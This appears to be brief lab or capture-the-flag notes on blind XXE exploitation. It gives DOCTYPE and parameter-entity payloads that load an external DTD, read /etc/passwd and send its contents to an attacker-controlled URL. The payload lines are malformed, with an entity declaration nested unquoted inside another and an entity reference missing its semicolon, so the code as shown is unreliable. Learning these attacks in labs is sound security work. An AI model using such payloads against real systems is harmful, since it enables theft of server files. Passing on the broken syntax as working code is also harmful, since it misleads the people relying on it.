Exploiting blind XXE to exfiltrate data using a malicious external DTD:

    -In this challenge we use stack entities means one entity inside another entity
    -<!DOCTYPE foo [<!ENTITY % Dtd SYSTEM "https://OUR-ID-URL"> % Dtd; % first; % inside;]> --> in request
    -<!ENTITY % first SYSTEM <!ENTITY % inside SYSTEM "https://OUR-ID-URL?%pass">>
    -<!ENTITY % pass SYSTEM "file:///etc/passwd">